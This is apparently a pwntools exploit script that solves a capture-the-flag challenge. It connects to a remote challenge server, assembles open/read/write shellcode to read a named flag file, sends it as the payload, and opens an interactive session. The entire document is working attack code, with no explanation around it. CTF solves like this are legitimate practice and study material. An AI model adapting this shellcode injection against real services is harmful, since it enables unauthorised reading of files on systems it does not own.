from pwn import *


NC = "nc ctf.tcp1p.com 8008".split()

elf = context.binary = ELF("./chall_patched")
r = remote(NC[1], NC[2])

# r = process("./chall_patched")

sh  = shellcraft.open("./flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt")
sh += shellcraft.read(3, 'rsp', 0x1000)
sh += shellcraft.write(1, 'rsp', 'rax')
#sh += shellcraft.exit(0)

r.sendline(asm(sh))

r.interactive()